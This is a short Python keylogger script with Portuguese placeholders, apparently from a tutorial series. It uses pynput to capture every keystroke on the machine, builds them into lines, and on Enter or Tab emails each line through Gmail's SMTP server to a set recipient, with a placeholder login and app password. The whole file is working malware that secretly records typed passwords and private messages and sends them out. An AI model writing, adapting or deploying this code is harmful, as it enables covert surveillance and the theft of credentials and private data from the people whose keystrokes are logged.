from pynput.keyboard import Key, Listener
import smtplib
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login("seu_email@gmail.com", "senha_gerada_topico_anterior")
array = []

def show(key): 
  typo = type(Key.enter)
  digito = type(key)
  if (key == Key.space):
    valida_key = ' '
  else:
    valida_key = ''
  # Verificando se o digito é uma class
  if(digito != typo ):
    valida_key = key 
    
  array.append(str(valida_key))
  key_join = ''.join(array)
  
  if (key == Key.enter) or (key == Key.tab):      
      var = ReplaceList(key_join)
      print ("Row: ", var)
      server.sendmail("remetente@gmail.com","destinatario@gmail.com",var)
      array.clear()     
        
def ReplaceList(key_join):
  ReplaceList = key_join.replace("'",'')
  return ReplaceList

with Listener(on_press = show) as listener:    
    listener.join() 
server.quit()